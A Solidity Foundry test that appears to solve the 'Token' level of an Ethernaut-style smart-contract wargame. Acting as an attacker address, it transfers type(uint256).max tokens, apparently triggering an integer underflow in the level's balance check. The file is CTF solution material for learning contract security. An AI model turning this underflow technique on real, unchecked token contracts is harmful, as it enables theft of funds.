// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "./utils/BaseTest.sol";
import "../src/levels/5-Token/Token.sol";
import "../src/levels/5-Token/TokenFactory.sol";

contract TokenTest is Test, BaseTest {
    Token public level;

    constructor() {
        levelFactory = new TokenFactory();
    }

    function setUp() public override {
        super.setUp();
        levelAddr = payable(_createLevelInstance());
        level = Token(levelAddr);
    }

    function testAttack() public {
        _attack();
        _validateLevel();
    }

    function _attack() internal override {
        vm.startPrank(attacker);

        // 1. Transfer tokens to some other address
        level.transfer(address(0x1), type(uint256).max);

        vm.stopPrank();
    }
}
